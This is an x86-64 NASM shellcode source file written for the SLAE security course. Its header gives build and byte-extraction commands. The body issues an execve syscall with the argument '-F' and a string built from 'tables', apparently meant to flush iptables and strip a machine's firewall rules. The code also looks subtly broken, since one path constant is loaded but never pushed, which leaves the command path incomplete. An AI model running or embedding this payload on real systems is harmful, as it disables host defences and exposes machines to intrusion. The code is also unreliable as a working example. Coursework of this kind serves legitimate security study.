; Filename:      shellcode-orig-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  09.02.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-orig-asm.nasm -o shellcode-orig-asm.o
; Linker:        ld -m elf_x86_64 shellcode-orig-asm.o -o shellcode-orig-asm
; Assembly dump: objdump -d ./shellcode-orig-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

	xor rax,rax
	push rax
	push word 0x462d
	mov rcx,rsp
	mov rbx,0x73656c626174ffff
	shr rbx,byte 0x10
	push rbx
	mov rbx,0x5370692f6962732f
	mov rdi,rsp
	push rax
	push rcx
	push rdi
	mov rsi,rsp
	mov al,0x3b
	syscall
